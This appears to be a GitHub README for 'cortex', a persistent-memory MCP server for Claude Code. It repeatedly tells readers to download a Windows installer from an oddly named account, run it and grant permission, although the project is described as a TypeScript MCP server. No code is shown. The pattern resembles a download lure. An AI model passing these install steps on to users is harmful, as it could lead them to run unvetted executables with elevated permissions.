# 🧠 cortex - Keep Claude Ready Every Session

[![Download cortex](https://img.shields.io/badge/Download-cortex-blue?style=for-the-badge&logo=github)](https://github.com/thorndikeconvivial76/cortex)

## 📥 Download and Install

1. Open the download page: https://github.com/thorndikeconvivial76/cortex
2. On the page, look for the latest release or the main download option.
3. Download the Windows file.
4. If the file comes as a .zip, right-click it and choose Extract All.
5. Open the extracted folder.
6. Run the cortex app or installer file.
7. If Windows asks for permission, click Yes.
8. Follow the on-screen setup steps until the app opens.

## 🖥️ What cortex does

cortex helps Claude Code keep track of what matters across sessions. It saves decisions, preferences, and context, then brings them back when you start again. That means you do not need to repeat the same details each time.

It is built for local use first. It stores memory in SQLite on your machine and can sync across more than one device when you want that. It also uses quality checks so only useful memory gets kept.

## ✨ Main features

- Saves decisions from past sessions
- Remembers your preferred way of working
- Restores useful context at the start of a new session
- Stores data in local SQLite files
- Supports multi-machine sync
- Keeps memory organized with quality checks
- Works as an MCP server for Claude Code
- Keeps your data on your own machine first
- Fits into a normal workflow with no manual note taking

## 🧩 What you need

- A Windows computer
- A modern web browser
- Permission to run downloaded apps
- Enough disk space for local data
- Claude Code set up if you plan to use it there

For best results, keep the app in a folder you can find later. If you plan to sync across devices, use the same account and setup on each machine.

## 🚀 First-time setup

1. Download cortex from https://github.com/thorndikeconvivial76/cortex
2. Open the file after the download finishes
3. Install or extract the app
4. Start cortex
5. Open Claude Code
6. Connect cortex as the memory source if the app asks for it
7. Let it read your current session context
8. Begin using Claude Code as normal

If you use more than one device, repeat the same setup on each one. cortex will then keep memory in step across machines when sync is enabled.

## 🛠️ How it works

cortex listens for useful session details and stores them in a local memory layer. It tracks things like:

- project choices
- user preferences
- repeated instructions
- important decisions
- context that should carry into the next session

When a new session starts, cortex injects the stored memory back into Claude Code. This gives the model a better starting point and cuts down on repeat setup.

## 🔒 Privacy and storage

cortex uses a local-first design. That means your memory lives on your own device before anything else. SQLite keeps the data in a simple local database file. If you turn on sync, cortex can share that memory with your other devices in a controlled way.

This setup works well if you want your assistant to remember things without relying on cloud-only storage for every note.

## 🧭 Typical use cases

- Keep Claude Code aware of your project rules
- Save coding preferences for later sessions
- Avoid repeating the same setup instructions
- Carry context across work on more than one computer
- Keep long-running projects consistent
- Build a stable memory layer for AI work

## ⚙️ Simple setup tips

- Keep cortex updated when a new version appears
- Use one folder for the app and its data
- Turn on sync only if you want shared memory across devices
- Review saved context from time to time
- Keep project names and preferences clear and short

## ❓ Common questions

### Does cortex need to stay open?
It depends on your setup. For session memory to work, cortex should be running when Claude Code needs it.

### Does it store files online?
It stores memory locally first. Sync is available for users who want shared access across machines.

### Can I use it without programming experience?
Yes. The main steps are download, open, connect, and use.

### What kind of data does it keep?
It keeps useful session context such as decisions, preferences, and working notes that help Claude Code start in a better state.

### Is this only for Claude Code?
It is made for Claude Code and uses the MCP format, so it fits that workflow best.

## 🔗 Download again

Download cortex here: https://github.com/thorndikeconvivial76/cortex

## 📌 Project details

- Repository: cortex
- Type: MCP server
- Focus: persistent memory for Claude Code
- Storage: local SQLite
- Sync: multi-machine support
- Topics: ai memory, context management, claude code, developer tools, mcp server, persistent memory, sqlite, typescript